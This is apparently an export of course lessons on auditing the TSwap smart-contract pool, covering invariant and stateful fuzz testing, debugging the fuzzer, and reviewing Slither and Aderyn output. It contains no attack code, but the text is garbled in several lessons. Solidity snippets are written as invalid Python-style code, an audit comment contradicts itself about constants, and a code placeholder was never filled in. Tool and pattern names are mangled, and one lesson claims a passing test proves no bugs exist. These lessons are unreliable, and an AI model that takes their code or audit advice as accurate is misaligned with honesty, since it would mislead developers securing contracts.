          title: Writing T-Swap a stateful fuzz test suite - Invariant.t.sol
          ---



          ---

          # Testing Smart Contracts with Invariants

          Hey there, in this blog post, we're going to walk through how to audit a smart contract using invariant testing. Specifically, we'll use the TSWAP contract codebase. By the end of this tutorial, you'll have a grasp on writing invariant test suites in Solidity.

          ## Overview

          Let's imagine you're tasked with a private audit. You're supposed to help someone stay secure. It's an awesome feeling when you come back with an audit report together with an invariant test suite. As we'll see in this tutorial, it's essential not to dive into looking at the code base before writing testing essentials. So yes, we're going to find bugs without even viewing the code base. Sounds crazy, right? Buckle up!

          ## Setting Up The Codebase

          We'll start by setting up our file structure. In our working environment, let's create a new folder called _invariant_. In this folder, we're going to house two Solidity (.sol) files. The files will be named `invariant.t.sol` and `handler.t.sol`, respectively.

          Once we've set this up, we're ready to start writing our tests.

          ## Building Our Invariant

          We'll begin with writing `invariant.t.sol`. We need to start defining our tests by first constructing the 'invariant'.

          Building up `handler.t.sol` will require us to dig deep into the codebase. However, we can get away with developing `invariant.t.sol` a little bit blind. It allows us to commence testing without scrutinizing the entire contract.

          ## Constructing Mock Tokens

          While preparing our test environment, we realize that our contract is interacting with the WETH token and a particular poolFactory. These factories take in WETH tokens as an input parameter. Therefore, as part of our setup, we're going to create mock tokens.

          Let's create another directory named _mocks_ where we will create some mock tokens. We will need one file called `ERC20Mock.sol`:

          We then proceed to create an `ERC20Mock`, which derives from `ERC20` token.

          This way, we prepare a simulated environment where the tokens we will use do not have actual value, which is critical for safe and responsible testing.

          ## Writing The Handler

          With our tests set up, our next step is to write the handler. While we could write asserts directly in our invariant, the cleaner approach is to compute these in the handler. This way, our assert becomes a one-liner:

          This way, we can ensure that our logic holds, regardless of the varying input parameters. In developing more complex software or systems, invariants play a crucial role in enforcing correctness.

          ## Conclusion

          Well, it's been a long post! Whew. But there you have it, you now have a good grasp of writing invariant tests for your smart contracts. Remember, practice makes perfect and don't shy away from puzzling your brains. It's part of the fun in blockchain development. Keep practicing!
        description: 'Patrick walks us through the invariant testing we perform on TSwap in invariant.t.sol.'
      -
        id: a5b53fd9-50f1-46d1-bcbe-11ff65fd418f
        type: new_lesson
        enabled: true
        title: Handler.t.sol
        slug: handler-t-sol
        duration: 18
        video_url: ApSkCH1snVHGLn101EXtkXyn1j100JwUiatcBA501D6n7o
        raw_markdown_url: /routes/security/5-tswap/22-handler-t-sol/+page.md
        markdown_content: |-
          ---
          title: Writing T-Swap a stateful fuzz test suite - Handler.t.sol, Deposit Function
          ---



          ---

          # Breaking Down DeFi Audits with Invariant Testing

          In this deep dive into DeFi audits, we will be covering a wealth of material ranging from DeFi to invariant testing. Do remember that we're dealing with complex topics, so if things are not making perfect sense, take a breather, and continue at your own pace. You're doing great by simply trying to digest this sizable chunk of advanced concepts.

          ## Building a Handler

          Let's start with the task of building our handler. A common technique that comes in handy when addressing large problems is to break the problem down into smaller segments. We're taking this approach with our handler development.

          In our contract, a constructor will create a TSWAP pool. Now, we need to test an invariant that the change in `X` (token balance) is equal to the expected change in `X`.

          Within our handler, we'll want to implement at least two main functions: a deposit function and a swap function. For the purposes of this tutorial, we‚Äôll focus on `deposit` and `swapExactOutput` functions as a starting point.

          ## Decoding Function Documentation

          One advantage we have while trying to understand these functions, is that the documentation is quite helpful. If there were no docs, we'd be wading through the code itself, which could be much more time-consuming.

          Taking `swapExecOutput` for example, the function documentation illustrates its working as follows:

          > swapExecOutput figures out how much you need to input, based on the output you want to receive. For instance, if you want ten output tokens of WETH and you're inputting DAI, the function will calculate the amount of DAI needed to get you the desired WETH and execute the swap.

          Such explanations in the documentation significantly facilitate understanding of the code, thus contributing to making the auditing process relatively less time-consuming.

          ## Keeping Notes

          While working through the process, it's good practice to keep notes or record findings, especially when there are missing parameters as we've noticed in the `swapExecOutput` function. Let's do this to maintain an audit trail for future reference.

          Here‚Äôs a simple note example:

          > Notes:Audit findings:Missing param in NatsSpec, missing deadline param in `swapExecOutput`. Also, remember to check with the protocol team for any documentation for better audit efficiency.

          ## Setting up Core Handler Actions

          Back in our handler, we want to focus on two primary actions, at least to start: depositing and swapping.

          To perform a deposit, we need access to the tokens. For swapping, we're likely to use `swapExactOutput`. We'll begin by implementing these, and gradually build from there. By writing a Fuzz test suite to execute these actions, we will not only be contributing to better code quality, but also making the protocol safer.

          Let's begin with creating our deposit function.

          ## Constructing the Deposit Function

          Our deposit function begins by defining our tokens, in this case, WETH and Pool tokens.

          With the availability of these tokens, we can proceed with determining the amounts for tokens to deposit, ensuring we set reasonable amounts to avoid overflow errors. The quantity of WETH to deposit will dictate the corresponding change in the Pool tokens.

          Once we execute the deposit, we compare our expectations (expected delta) with the actual changes in the Pool and WETH tokens.

          We are effectively done with our deposit function, but we didn't sign up to only handle deposits; we're here to test the swap invariant.

          ## Building the Swap Function

          The auditing process includes verifying code and ensuring that invariants hold through operations like swaps. That's part of what we're trying to achieve here, which brings us to create our swap function.

          > "Remember, the bigger the vulnerabilities you uncover, the bigger the improvements you can make, ultimately contributing to the overall safety of DeFi protocols and the blockchain ecosystem."
        description: 'Implementing the deposit function within our testing handler.'
      -
        id: 03eddcf6-15bb-43fb-8686-ce58db4c094f
        type: new_lesson
        enabled: true
        title: 'Handler Swap Function'
        slug: handler-swap-function
        duration: 12
        video_url: ODM2r11y00SBBLuBISkxsjJS8gu7T800qBC00xz6Hp1Qf4
        raw_markdown_url: /routes/security/5-tswap/23-handler-swap-function/+page.md
        markdown_content: |-
          ---
          title: Handler.t.sol - Deposit Function
          ---



          ---

          # Testing Uniswap's Token Swap Function

          In this post, we're going to thoroughly explore the function which swaps a pool token for `WETH` along with the underlying math involved. In Uniswap, `WETH` is short for Wrapped Ethereum, a token that represents Ether 1:1, enabling it to adhere to the ERC-20 standard.

          ## The Swap Function and Its Logic

          Firstly, we bind `outputWETH` between 0 and `UNI_64_MAX` to provide a more realistic transaction range. We don't want all the money in the pool to be swapped out. This would be logically unfeasible and destructive for liquidity, hence we return if `outputWETH` exceeds the pool balance.

          ## Delving into the Math Underlying the Function

          In order to ascertain the pool token amount that must be minted or burnt based on `outputWETH`, we employ the following mathematical derivation.

          In the `TSWAP` pool, there is a function called `getInputAmountBasedOnOutput`, which yields the `delta_x`. Without going into the specifics of this formula, let's understand why it works with a bit of simple algebra.

          > _"It's in understanding how to manually solve these equations that you understand the importance and workings of the smart contract functions we work with."_

          We utilize this function on the `TSWAP` pool to get the `poolTokenAmount` which is our `delta_x`.

          ## Updating Starting Deltas

          The reason for the `-1 * _outputWETH` is because the pool is losing `WETH`, hence making the `deltaY` negatively inclined. We comfortably say that it is the `expectedDeltaY`.

          ## Minting Pool Tokens for Swapping User

          Here, we commence by creating a new person `address swapper`. This is the person performing the swap with the pool. If the swapper doesn't have enough pool tokens for this swap, we mint the difference along with one additional token just to be explicit.

          ## Actual Token Swap

          This is where the actual token swap occurs. We begin a new transaction under the swapper's address. This transaction includes approval for the pool to manage their pool tokens, with no limit set (`UNI_256_MAX`), with the `swapExactOutput` function called to perform the swap.

          ## Finalizing Swap and Updating Ending Deltas

          After completing the swap, we simply update our ending deltas and calculate the actual deltas. The actual deltas are simply the initial balances subtracted from the final balances.

          ## Conclusion

          The entire handler function, `swapPoolTokenForWETH`, crafts a transaction, conducts a swap on the pool and calculates expected and actual balance changes to ensure the protocol behaves as expected.

          The process can feel challenging when dealing with mathematical equations, but abstraction makes it easier. We've constructed our handler focussing on the process more than the math. This handler allows easier stateful fuzzing tests, ensuring the safety and security of anyone interacting with the pool.

          This testing framework aids in understanding how these token swapping protocols are designed and behave, giving us more confidence in the robustness of Uniswap's smart contracts.
        description: 'Implementing the swap function within our testing handler.'
      -
        id: 19a75983-8466-48de-9cb8-bc84bd3981ae
        type: new_lesson
        enabled: true
        title: 'Final Invariant And Tweaks'
        slug: final-invariant-and-tweaks
        duration: 3
        video_url: to1lD02l00jStNb9SW9VG4RqWRQban9mnbh8AdBZEwTPY
        raw_markdown_url: /routes/security/5-tswap/24-final-invariant-and-tweaks/+page.md
        markdown_content: |-
          ---
          title: Final Invariant & Tweaks
          ---



          ---

          # Diving into Invariants: Writing Tests in Coding

          In this blog post, we will uncover the steps to set up tests for an invariant in our code. Precisely, we will write a simple test and furthermore guide you through the setup for our handler.

          ## Writing the Test

          After establishing our invariant, it's time to proceed to writing a basic test. This test could be as simple as asserting that the actual `Delta X` from our handler should equal the expected `Delta X`. Here is how we could write this test.

          ```python
          assert handler.actualDeltaX == handler.expectedDeltaX
          ```

          Though I must confess, I often prefer writing `assertEqual` as it usually provides more detailed information, you can certainly opt for our above statement which succinctly accomplishes the task.

          The actual test, however, functions in rudimentary terms to ensure that our expected delta is aligned with the actual delta in the handler.The expected delta is assigned using the function `Y times X equals K`, which calculates the expected deltas. We then compare the computed deltas to the actual deltas.

          ## Setting Up the Handler

          Now, let's dive into actually setting up the handler, which calls for us to move up a bit, retracing our steps.

          To initiate the handler setup, we need to first import it. This can be done using the following code:

          ```python
          import handler from 'handler.t.sol'
          ```

          After successfully importing the handler, we can create a new handler using the `new` keyword. This handler takes the parameter as `poolBytes for Array memory`.

          > Note: All the variables used above can be replaced depending on the specific needs of a project.

          In conclusion, we have seen how easily we can write the basic structure of a test and set up our handler. The ease at which we can perform these tasks simplifies our coding endeavors and ensures more stable code in the long run.

          Remember, while writing tests, our ultimate goal is to ensure that our code behaves as we expect it to under different circumstances. After all, in the words of a wise coder, "Code without tests is bad code.". Make space for tests the next time you code and watch the number of errors drop significantly.
        description: 'Comparing Deltas in Handler Test - Quick Guide. Demonstrates how to set up and run an assertion test for deltas in a handler.'
      -
        id: e455fe14-0139-4841-a296-19d5c9c27b3b
        type: new_lesson
        enabled: true
        title: 'Debugging The Fuzzer'
        slug: debugging-the-fuzzer
        duration: 8
        video_url: zO5xGKOv629jSkzOJa1VOs9vtd01Ye8ZUaGODCpiOmCs
        raw_markdown_url: /routes/security/5-tswap/25-debugging-the-fuzzer/+page.md
        markdown_content: |-
          ---
          title: Debugging the Fuzzer
          ---



          ---

          # Debugging Your Code the Way a Pro Would Do It

          In today's lesson, we'll dive into a realistic process of debugging, using live examples and explaining how to overcome certain coding hurdles.

          Typically, I spend a large chunk of my work hours debugging unexpected failures in code scripts, and I thought it would be valuable to share my experience with you.

          Often, you'll need to rerun your code, alter variables, and cross your fingers, hoping you'd not receive the same error. Debugging is intriguing and requires a keen eye for detail.

          ## Debugging a Program

          Here is a practical example of how I discovered, investigated, and resolved errors in a program, step by step.

          ![](https://cdn.videotap.com/YQdEYI0P1ab2zx1GvZnZ-68.11.png)

          ### Step 1: Testing the Code

          As expected, the program failed. The error notably pointed out that the `TSWAP pool must be more than zero`. From my experience, such failures are usually attached to some misconfigured variables or misplaced logics.

          In this case, when checking back on the `handler`, there was a deposit function configured with zero - a value that must certainly be greater than zero.

          I then had to ask myself, what seemed to be the `minimum deposit`?

          ### Step 2: Debugging Interlude

          I discovered something crucial here - the `minimum WETH liquidity`. This was the `minimum deposit amount` I should've assigned instead of zero.

          Using this newly found information, I decided to replace the zero value in the `bound` function with this minimum deposit amount and then reran my test.

          It appeared that the function `get input amount based off output` had been assigned the zero value, as was previously the case. Here we had to replace the zero with `pool. Get minimum WETH deposit amount` to avoid similar complications.

          ### Step 3: Learning and Debugging

          I intentionally ran into these issues because it's an inevitable part of the coding process and learning experience. Debugging requires a skill to easily navigate through logs - It's a practice I find effective in learning code structure.

          At this point, the `assertion` seemed to hit a snag. The immediate response was an `actual Delta X` being zero while on the right hand side, it was a large number. The inconsistency in values raises the question - where did I go wrong?

          Turns out, there was a small but significant mistake in the addressee in my code. It had mistakenly been set to `address this`, when it should have been `address pool`.

          ### Step 4: The Resolution

          Once that was rectified, it seemed like we were getting somewhere. The code was now giving a different error, an indication that we were making progress. However, I noticed there was a significant variance between the left and right side values - almost a clear doubling.

          The key question now was whether my code was the problem or there was an `invariant` that was actually broken. Debugging requires such critical thinking to diagnose the root cause of errors.

          _SECTION OF CODE TO INSERT HERE_

          It turned out I had made an incorrect assignment in the `handler`. The `Delta X` was supposed to be the `pool token amount` calculated earlier. This led to an unexpected elevation in the `outbound WETH` size, causing the script to keep reverting.

          To solve this, I had the `bound` function call on the `WETH balance of the address pool`, as opposed to it being manually large.

          #### Handling Debugging Challenges

          > "In debugging, there's a lot of trial and error, and it's okay. You're going to encounter a few challenges on your first try but with perseverance and keen attention to detail, you'll find a way to resolve these errors".

          After making the necessary alterations and rerunning the tests, the program finally passed. This means the code was safe and no bugs were found.

          ## Conclusion

          Even after successfully debugging, remember that your code is always subject to possible future errors. But now armed with the skills and patience to debug, you are better prepared to face any challenge that comes your way.

          Stay creative and keep debugging!
        description: 'Debug Solidity Test Failures with Foundry'
      -
        id: 1633a5de-6dcd-40c1-9afb-5a03f74b36e4
        type: new_lesson
        enabled: true
        title: 'One Last Huzzah'
        slug: one-last-huzzah
        duration: 10
        video_url: AA8PgFAa02NjRytkaRt3a902XF5KfYP4yTPnhDMDN9BD4
        raw_markdown_url: /routes/security/5-tswap/26-one-last-huzzah/+page.md
        markdown_content: |-
          ---
          title: One Last Huzzah
          ---



          ---

          # Unveiling the Power of a Stellar Stateful Fuzzing Test Suite

          Ever experienced one of those situations when you felt like capitulating because nothing seems to work? Only to find that, against your better judgment, you gave one last attempt and everything fell into place? That's exactly the kind of journey we are about to hop on. What started as a simple methodical troubleshooting transmogrified into an exploration of the ever-useful, indispensable tool ‚Äì the stateful fuzzing test suite.

          ## EQ. X vs. Y Test Runs

          Sometimes, when we're stuck with a challenging bug and can't seem to point out why it exists, we need to remain resolute and alter our approach. This was exactly the case when I was working with a piece of code and an assertion failed.

          Changing our test from X to Y and modifying the stats gave a rather perplexing output - the core invariant seemed to be breaking.

          ## Spelunking Through the Log Files

          Like seasoned detectives, we read through the log files for some answers. This particular log file was teeming with `deposits` and `swaps`, a lot of balance adjustments, and, in the last section, things seemed to head south. Something was going awry in the last swap which led to an unexpected disparity between the left and right results.

          > "...usually there's a lot of alpha in this last section, like what happened in this last swap, which caused this to get way out of whack because everything was fine right beforehand..."

          While digging further into the function call in the `handler`, my attention was drawn to multiple `transfers` being emitted - one more than was expected.

          ## Unearthing the Rogue Code

          Upon close inspection of these transfers, I discovered some discrepancies:

          1. There was an unusual `transfer` from the `TSWAP pool` to the `swapper`
          2. Subsequently, another weird `transfer `was being emitted from the `swapper` to the `TSWAP pool`
          3. Then again, there was another `transfer` from the `TSWAP pool` to the `swapper`

          Needless to say, this wasn't what I was expecting. Recognizing that my stateful fuzzing tests were pointing towards a peculiarity, I decided to dive deep into the code base.

          ## AHA - The Bug!

          As I ventured into the low-level swap function, I unraveled the mystery - I discovered we'd included an extra incentive in the swap function where for every 10 swaps, an extra token is awarded to the user.

          This was the heart of the issue. It was resulting in the protocol breaking because:

          - There was an unexpected increase in the swapper's balance
          - For any fee transfer token, the internal function would transfer excessive tokens, thus breaking the protocol invariance

          It dawned upon me that the violation of the protocol invariant, in this case, the `XxY=K formula` was generating this bug.

          ## Significance of Stateful Fuzzing tool

          Despite all these findings, it was the fruit of a good deal of work. Finding the code-breaking bug involved meticulous editing and testing using the stateful fuzzing tool. However, it was unequivocally worth it.

          Manual review, despite its efficiency, can be laborious to discover all bugs. Therefore, it becomes essential to leverage automation as a means to make our jobs simpler. That's where the role of stateful fuzzing comes to the forefront. It allows us to comprehend protocol invariants on a superior level while giving us an inexpensive way of finding bugs and breaking protocols.

          It's pivotal to understand how this powerful tool works, even if you're unable to grasp the complexities of the TSWEAP handler.

          Ultimately, the ability to discover potential bugs by writing an effective test suite is an indispensable instrument in your toolkit. Once the protocol's invariance is identified and it is discovered that no tests are being run for it, it is a clear indicator that a bug lurks somewhere around. For instance, for a codebase comprising 10,000 lines of code, conducting an audit could consume abundant resources, but a stateful fuzzing test suite can accomplish the task in a day or two.

          ## Learning and Adaptation

          Through this experience, I understood that weird ERC-20s, rebase, and fee-transfer tokens can disrupt our protocols. These conditions, along with our naive incentive for swappers, can violate protocol invariance, causing a breakthrough for bugs. It underlines the importance of knowing the specifics of the tokens we are working with - their advantages, drawbacks, and the protocol invariants they obey.

          Ultimately, establishing a protocol invariance pattern in the writing of functions or applying checks using the "checks, effects, interactions" paradigm can be the game-changer in reinforcing your code against bugs.

          In all, spending a bit of time setting up the stateful fuzzing test suite can help you detect bugs early, maintain your invariances and ensure the code you wrote stays robust, performant, and error-free.
        description: 'Patrick explains how fuzz testing and formal verification methods can be used together to detect bugs in Solidity smart contracts.'
      -
        id: 1063c7cf-05a5-4a46-80e2-d7fab3690a3a
        type: new_lesson
        enabled: true
        title: 'Notes On Invariants'
        slug: notes-on-invariants
        duration: 4
        video_url: O8RK1gGeIBoX1b01gR3M008uMhVW2mT01BnXL1NN00urwsg
        raw_markdown_url: /routes/security/5-tswap/27-notes-on-invariants/+page.md
        markdown_content: |-
          ---
          title: Notes on Invariants and other Types of Tests
          ---

          _Follow along with the video:_



          ---

          # Welcome to the World of Invariants and Fuzzing Tools

          Hi all! We've been on quite a journey together, haven't we? We've had our brains whipped into a frenzy learning how to effectively use fuzzing tools and, yes, there were certainly times when we delved into confusing territories. However, we also learned how these powerful tools can help us discover and break invariants, quickly identifying issues in protocols. In this post, we'll build upon these foundational skills, diving deeper into an exploration of ERC20s, core invariants, and much more!

          ## Unraveling the Mysteries of ERC20s

          The world of ERC20s can often seem daunting and puzzling, but do not fret, we're here to unravel its mysteries. We have only just scratched the surface of understanding these tokens in our sessions, but expect to see more of them popping up as we progress through our course.

          ## Defining Core Invariants and Breaking Them Down

          Equally important to our exploration are, of course, core invariants. These are rules that remain unaffected regardless of the system state. Now, if you're still scratching your head over the term "freepy" (or CEI, as others might call it), think of it as a practice of implementing pre and post-checks to uphold certain invariants.

          To illustrate this, let's look at two protocols - Uniswap and Euler. The former has an intact core invariant embedded within its codebase; the Euler protocol, unfortunately, does not. This lack of an invariant was a significant contributor to the much-talked-about Euler hack that happened recently.

          ## Exploring Different Testing Tools and Approaches

          While our journey has already spanned areas of forge fuzzing, stateful fuzzing, and invariants, there are still a few facets we're yet to traverse. Say, for example, `Echidna`. In case you're unfamiliar with it ‚Äì it's a powerful fuzzing tool that pairs excellently with Foundry Fuzzing Consensus's paid tool.

          Mutation and differential testing, on the other hand, didn't make the cut for our workshop, so we will discuss them briefly here.

          > Mutation testing involves modifying parts of the code to evaluate if these changes break any existing tests.

          Let's turn to the git repo attached to this tutorial for reference. Under `audit_data`, you'll find a 'test' folder with a note about differential testing. Also, there is a differential folder where you can perform fuzz testing against the output of `uniswap`.

          For mutation testing, imagine altering `Tswappool.sol` in various ways, such as deleting a line, swapping out math, or changing a greater-than operator to a less-than. The objective here is to ensure your tests catch these errors.

          Through this practice, you can evaluate the effectiveness of your testing framework. While we didn't perform any mutation testing in our session, it's a valuable tool you should consider implementing.

          ## Driving the ‚ÄòSolodit' Train

          We're gearing up to dive into `Solodit` in the upcoming sessions. With `Solodit`, we can learn from historical findings, uncovering a wealth of insights from the peculiarities of ERC-20s to the importance of preserving invariants.

          Parsing through the archives of `Solodit`, you'll discover numerous examples of how weird ERC-20s have caused problems. Try a simple search for 'invariants' on Solodit, and you'll unearth a treasure trove of invariant findings, spelling out a wealth of knowledge and learning opportunities.

          ## Wrapping It Up!

          To sum up, we've done a ton of work together; we've navigated unchartered territories, explored protocols, learned about testing and more. On this journey, we've embraced the weirdness of ERC20s, the intriguing world of invariants, and a handful of robust testing tools.

          Stay tuned for more exciting stuff coming your way! Remember, we're learning together, we're growing together, and, most importantly - we're making the future of protocols safer, together. Until next time, happy learning!
        description: 'Covers security tools like fuzzing, Echidna, and mutation/diff testing to detect issues stresses the importance of testing & learning from history.'
      -
        id: 413b0bcc-889f-4c1c-a23e-07cda2063929
        type: new_lesson
        enabled: true
        title: 'Recon: Manual Review Introduction'
        slug: recon-manual-review-introduction
        duration: 2
        video_url: ilK5K02h00Z3aDKoX02B018ZtF2s9AfC1oOYbKHhf00SKtDM
        raw_markdown_url: /routes/security/5-tswap/28-recon-manual-review-introduction/+page.md
        markdown_content: |-
          ---
          title: Recon Manual Review Introduction
          ---



          ---

          # Manual Review of TSwap Pool: A Deep Dive

          Hey, awesome reader! Welcome back to the blog. In the previous posts, we've talked all about tools, code inspections, and automated reviews. However, there's one aspect that invariably remains at the core of the process - the manual review. So, let's grab a cup of coffee and plunge together into the manual review of the TSwap pool!

          ## The Unreplaceable Manual Review

          Here's the thing about manual reviews. This bad boy can find bugs that no static analyzers, no automated systems, and no testing suites can.

          > Remember, never underestimate the power of the human eye when it comes to code.

          Every line of code is a potential pitfall and the manual review is our best chance at spotting those tricky bugs that can slip through all those automated testing suites. Yeah, we've come a long way with our tooling approach. But, nothing, I repeat **nothing**, replaces the manual review.

          ## The Saga of the Under_Swap

          Let's recount a bit of our journey. We've written a port, we've had some type of high, and we have the curious case of the `under_swap` that breaks invariants. Yes, we spotted the issue with our fuzzing test suite. So, kudos to us!

          But let's not stop at that, shall we? There could be an entire universe of other issues lurking in the code base. Sure, we could write more tests, more automated checks, more everything. But, we've reached the point where it's time to dig in with our manual review.

          Remember,

          > Automation is great, but manual code review is the secret sauce that makes everything click!

          So, are you ready to walk through the code base with me?

          ## Prepping Up For The Manual Review

          Before we dive in, make sure you're comfortable. Have a cuppa joe if that's your jam. Maybe take a break if you haven't yet. Because we're going on a bug hunt! It's not just about spotting the bugs. It's about understanding why they happened. It's about writing down our findings and submitting the report. It's about replaying the process again and again.

          > Remember, repetition is the mother of skill.

          You might be thinking, "Patrick, buddy, this is so boring! Do we really have to...?" Yes, you do! This is exactly what you need to become a better developer, a better tester, a better debugger. It's the detail, the persistence, the grit that turns you from a coder into a **code warrior**.

          ## Performing the Manual Review

          Alright, it's time for the main event. Let's roll our sleeves up, put our debug glasses on, and let‚Äôs do the manual review.

          # Wrapping up the Manual Review

          In the manual review, we'll be going through the codebase, and document our findings. You're not alone and we will be doing this together. In the later sections, we can be a bit more breezy. But right now, this is where the magic happens. Write the report with me. This is your story. Your journey into the bowels of the codebase. The monsters you fought, the bugs you squished.

          # Conclusion

          So, what are you waiting for? Let's get cracking! This is gonna be an exciting journey! Stay tuned for our next blog post where we'll be sharing insights from our manual review, documenting our process and achieving our goals step by step, bug by bug. Remember,

          > The best way to find your skills is to lose yourself in the code.
        description: 'In this video, Patrick discusses the importance of manual codebase review along with tooling, specifically focusing on TSWAP pool.'
      -
        id: 2a1b2266-87e2-4546-a62d-6e495dc424d3
        type: new_lesson
        enabled: true
        title: Slither
        slug: t-swap-manual-review-slither
        duration: 2
        video_url: E101UChmT02NMDb1SquvieKmJKSnMZ2PNizDfc2fvMgGo
        raw_markdown_url: /routes/security/5-tswap/29-t-swap-manual-review-slither/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review Slither
          ---



          ---

          # An In-Depth Guide to Manual Review in Solidity

          In this blog post, we'll be taking a deep dive into the process of manual review in Solidity. We'll be using a comprehensive set of tools including Make Slither and Solidity itself to conduct our review.

          Before we jump into this, it's vital that we kick start the process by running our review tools.

          > _For context, our group has a well-configured Slither that's ready to use, in addition to a Makefile with Make Slither, which also looks pretty good._

          ### Analyzing Slither's Output

          Walking through the console output, we find mentions of potentially uninitialized variables. The Pool Factory, s_pools, and s_tokens are flagged by Slither as never being initialized.

          In the lines regarding Pool Factory and useContext functions, there are mentions of methods like `createPool` and `getPool`. It seems like the `S_Pools` and `S_Tokens` data mappings are not getting initialized. Let‚Äôs delve deeper into this.

          Although these data mappings trigger an error, it's unlikely to be a major issue. The error arises because Slither expects that our `S_Pools` mapping could be empty at some point and we're performing checks on it. However, this behavior is fine and exactly what we want.

          The same applies to `S_Tokens`.

          > **Key point:** A useful feature of Solidity is that querying a mapping for a non-existent element returns a zero value, not an error.\*

          ### Identifying Potential Issues

          The console output also flags a missing zero check - something that could lead to problems. We're not performing a zero address check in our constructor, which is not ideal.

          ```javascript
          constructor(address _token) public {
              require(_token != address(0));
              token = Token(_token);
          }
          ```

          So, an important note in your audit should be the lack of a zero address check in the constructor. Fortunately, Slither has already proven to be quite useful in finding potential issues.

          ### Dealing with Reentrancy

          Towards the end of Slither's report, we're alerted to a potential reentrancy in the `T_SWAP pool swap` function.

          ![](https://cdn.videotap.com/1Zwcjq5wz3Hy0mGdOPrV-83.14.png)

          While this function prompt is green (indicating it's not necessarily a problem), we need to understand the scenario better to evaluate its implication fully. Browsing through contract interactions and function call patterns can help us figure out if this is a legitimate reentrancy issue or a false positive.

          Finally, Slither alerts that different versions of Solidity are being used. Not an ideal situation, but not critical either, particularly if the primary working versions are intact. But hey, thanks for the heads-up, Slither.

          ### Wrapping Up

          All things considered, using tools like Slither for a manual review of Solidity code can reveal potential, and sometimes subtle, issues. Leveraging these tools creates a smoother and more efficient analysis process. Stay curious, stay alert, and keep probing. Your diligence will pay off in the form of solid, bug-free, and highly secure code.
        description: 'Patrick runs through using Slither on the TSwap repo.'
      -
        id: 745dc32d-27a5-4ac4-9d49-43bcf15e78c8
        type: new_lesson
        enabled: true
        title: Aderyn
        slug: manual-review-aderyn
        duration: 2
        video_url: 7VCF3MufhYfxh02xhSjgRo7rnV0202nfw02jzTF200aUY9N8
        raw_markdown_url: /routes/security/5-tswap/30-manual-review-aderyn/+page.md
        markdown_content: |-
          ---
          title: Manual Review Aderyn
          ---

          _Follow along with the video:_



          ---

          # Introducing the New Version of Aderyn, an Essential Audit Tool

          Hello, code enthusiasts! Today, I'm going to do a quick run through a unique code auditing tool: Aderyn. Since I've started filming, we've been doing incredible stuff with the script, and there's a lot to share with you! The tool has recently undergone some upgrades, and in this post, we'll be checking out what we can do with the updated version of Aderyn. Let's dive in!

          ## Installing Aderyn and First Run

          As the first step, I went on to update Aderyn using `cargo install Adarin`. This installs the new version for us. With this modification, you can perform a quick audit just by executing the command `aderyn a` - simple but powerful. Still, an old method, `Aderyn`, works just fine if you're comfortable with it.

          ## The Audit Report: Understanding the Issues

          On opening the `report.md`, you'll notice a list of issues. Most of these are NC (Non-Crit) issues. These aren't crucial, but addressing them can improve your code's performance and readability.

          #### Unused Internals

          My Aderyn installation flagged some functions that are not used internally. So, marking them as `external` would be ideal, like the TSWAP pool line 307 issue. The piece of code here isn't used internally, marking it public is a waste of gas.

          ```bash
          @audit info, this should be external
          ```

          #### The Literals vs Constants Debate

          Aderyn pointed out another common issue - the use of literals instead of constants on TSWAP pool line 303. Essentially, magic numbers should not be just literals - they should be defined as constants.

          ```bash
          @audit info magic numbers. These should not be defined as constants.
          ```

          ### The Index Field Dilemma

          We also stumbled onto an 'event missing index fields' on TSWAP pool line 62. Now, this is a tricky one. While many people prefer having events indexed, I belong to the group that believes in fewer indexed fields. Therefore:

          ```bash
          @audit info. Three. Events should be indexed if there are more than three params.
          ```

          Remember, this is more subjective and up to your coding preferences.

          But we've done quite well so far with the audit, discovering issues and remedying them with Aderyn.

          ## Wrap Up: The Power of Automated Code Auditing

          The beauty of having an automated script like Aderyn lies in its ability to uncover even the minutest issues which could otherwise be overlooked. Even though some of us might prefer manual code reviews, tools like Aderyn offer a great starting point for clean, optimized code.

          This hands-on auditing process can be a fun, engaging way to discover new improvements, ensuring your code performs better and is more maintainable.

          > Remember, quality isn't an act, it's a habit.

          On those wise words from Aristotle, let's wrap up and get back to more code improvements in our next post. Happy coding until then!
        description: "Using Cyfrin's Aderyn to find some non-critical bugs in TSwap!"
      -
        id: 044e8cae-6cec-4e70-a27c-c595969403af
        type: new_lesson
        enabled: true
        title: PoolFactory.sol
        slug: pool-factory
        duration: 6
        video_url: qLPEwquLPE8IyA00d00ksftrLHwenhkfs1Q6N1gkGOaDE
        raw_markdown_url: /routes/security/5-tswap/31-pool-factory/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review PoolFactory
          ---



          ---

          # A Deep Dive into Smart Contracts: Unraveling Pool Factory and TSWAP Pool

          In this post, we're exploring the Tincho methodology of reviewing smart contracts, through which we'll address an audit of two solidity contracts: pool factory and TSWAP pool. For those new to the land of contracts and Solidity, don't worry! We'll break things down in an accessible way.

          ## Spot the Import: Pool Factory

          ![](https://cdn.videotap.com/rzbl0Otqs4FSU2qtnoIs-26.08.png)

          Initially, the pool factory has a couple of imports. The interesting one is the IERC 20 forged import. Although the forge interface isn't something I heavily engage with, it catches my eye and is worth deeper exploration some other time. Apart from the IERC 20, we have the import for our second character today‚Äì TSWAP pool.

          The pool factory is the infrastructure of this system because it deploys and launches the pools. In simple terms, it's the bedrock on which every pool stands.

          Upon reviewing, we encounter two error messages - "Pool already exists" and "Pool does not exist." These are indicative of conditions for pool creation.

          ```javascript
          if (poolExists) {
            revert("Pool already exists");
          }
          ```

          The contract checks if a pool already exists during creation, thus preventing any duplications.

          ## The First Bug

          On further delving, it appears the second error message is not used anywhere. This was discovered after a quick code audit. This is our first discovery of a bug - a redundant error message that can be expunged from the code. This certainly won't make or break the system but highlights the fact that some cleaning up and code review could be beneficial.

          ## Deciphering the Mappings

          There are a couple of private mappings - `tokenTopool` and `poolTotoken`. They allow backward and forward retrieval of pool-token associations. The WETH token is immutable as it pairs with every token.

          Among events, the `poolCreated` is noticeable and appears to be the main event.

          Concerning the external functions, `createPool` takes the spotlight as the major function.

          ## Event Details and Function Understanding

          We've added an informational constructor setting the WETH token and now we can deep delve into the `createPool` function which stands out as the key player here.

          The `createPool` function gets a token address that is mapped to the WETH, forming a token-pool pair. If a pool with this token address is tried to be created again, the system will revert with the error message that the pool already exists.

          Furthermore, this function also encompasses the naming logic for the pools.

          The system is retrieving the name of the ERC 20 token and appending it to the word "TSWAP" to name the liquidity token. The liquidity token represents the shares of the token given to the LPs (Liquidity Providers).

          Apart from the naming convention, it's also noteworthy to point out the symbol logic ‚Äì

